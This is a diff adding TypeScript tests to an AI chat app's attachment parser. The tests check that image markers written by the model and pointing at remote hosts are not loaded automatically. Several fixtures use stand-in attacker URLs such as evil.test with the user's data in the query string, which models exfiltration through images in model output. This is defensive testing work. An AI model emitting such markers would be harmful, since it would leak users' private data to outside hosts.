@@ -1,4 +1,10 @@
-import { isAttachmentBoilerplate, parseUserMessageContent, isPdfContentType, stripLookupSourceCaption } from "@/lib/messageAttachments";
+import {
+  isAttachmentBoilerplate,
+  isPdfContentType,
+  parseMessageImages,
+  parseUserMessageContent,
+  stripLookupSourceCaption,
+} from "@/lib/messageAttachments";
 import { MATH_CAMERA_PROMPT } from "@/lib/math/cameraPrompt";
 import { BIOLOGY_CAMERA_PROMPT, PHYSICS_CAMERA_PROMPT } from "@/lib/scanner/subjects";
 
@@ -41,5 +47,64 @@ describe("messageAttachments", () => {
     expect(stripLookupSourceCaption("Source: Car - Wikipedia")).toBe("");
     expect(stripLookupSourceCaption("_Source: Ear - Wikipedia_")).toBe("");
     expect(stripLookupSourceCaption("Here is a car.\n\nSource: Wikipedia")).toBe("Here is a car.");
+  });
+});
+
+describe("[Image: …] markers load only Recall attachments", () => {
+  const ID = "550e8400-e29b-41d4-a716-446655440000";
+
+  it("keeps the server's attachment markers as pictures", () => {
+    const parsed = parseMessageImages(
+      `[Image: /attachments/${ID}/file]\n[Image: https://api.recall.test/attachments/${ID}/file]\nA car.`,
+    );
+    expect(parsed.images).toEqual([
+      { attachmentId: ID, path: `/attachments/${ID}/file` },
+      { attachmentId: ID, path: `https://api.recall.test/attachments/${ID}/file` },
+    ]);
+    expect(parsed.textWithoutImages).toBe("A car.");
+  });
+
+  it("turns a model-written remote marker into a tap-to-load image, never a picture", () => {
+    const parsed = parseMessageImages(
+      "Your week.\n[Image: https://evil.test/p.png?d=dentist-tuesday]",
+    );
+    expect(parsed.images).toEqual([]);
+    expect(parsed.textWithoutImages).toBe(
+      "Your week.\n![](<https://evil.test/p.png?d=dentist-tuesday>)",
+    );
+  });
+
+  it.each([
+    "[Image: http://evil.test/p.png?d=1]",
+    "[Image: HTTP://evil.test/p.png?d=1]",
+    "[Image: https://user:pw@evil.test/p.png]",
+    "[Image: //evil.test/p.png?d=1]",
+  ])("drops %s", (line) => {
+    expect(parseMessageImages(`Hi\n${line}`)).toEqual({ images: [], textWithoutImages: "Hi" });
+  });
+
+  it("keeps the app's own local markers as pictures (they never leave the phone)", () => {
+    expect(parseMessageImages("[Image: local]\n[Image: file:///tmp/scan.jpg]").images).toEqual([
+      { attachmentId: null, path: "local" },
+      { attachmentId: null, path: "file:///tmp/scan.jpg" },
+    ]);
+  });
+
+  it("loads a marker with a Recall attachment id from the API, whatever host it names", () => {
+    const parsed = parseMessageImages(`[Image: https://evil.test/attachments/${ID}/file?d=1]`);
+    expect(parsed.images).toEqual([
+      { attachmentId: ID, path: `https://evil.test/attachments/${ID}/file?d=1` },
+    ]);
+  });
+
+  it("leaves a marker inside fenced code as code", () => {
+    const content = "```text\n[Image: /attachments/x/file]\n[Image: https://evil.test/p]\n```";
+    expect(parseMessageImages(content)).toEqual({ images: [], textWithoutImages: content });
+  });
+
+  it("keeps a remote marker the user typed as their caption text", () => {
+    const parsed = parseUserMessageContent("look [at] this\n[Image: https://evil.test/p.png]");
+    expect(parsed.images).toEqual([]);
+    expect(parsed.caption).toBe("look [at] this\n[Image: https://evil.test/p.png]");
   });
 });
